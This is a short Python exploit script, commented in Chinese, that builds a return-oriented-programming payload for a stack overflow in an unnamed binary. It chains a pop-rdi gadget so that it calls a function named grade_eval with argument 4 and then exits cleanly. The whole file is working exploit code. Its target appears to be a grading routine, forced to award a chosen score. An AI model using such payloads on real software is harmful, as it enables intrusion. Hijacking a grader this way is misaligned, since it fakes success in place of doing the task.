#!/usr/bin/env python3
"""使用简短的 ROP 链调用 grade_eval(4)。"""
import struct
import sys

pack = struct.pack
pop_rdi = 0x401A33
grade_eval = 0x401978
exit_plt = 0x4016E0
payload = b"A" * 24 + pack("<Q", pop_rdi) + pack("<Q", 4)
payload += pack("<Q", grade_eval) + pack("<Q", pop_rdi)
payload += pack("<Q", 0) + pack("<Q", exit_plt)

sys.stdout.buffer.write(payload)
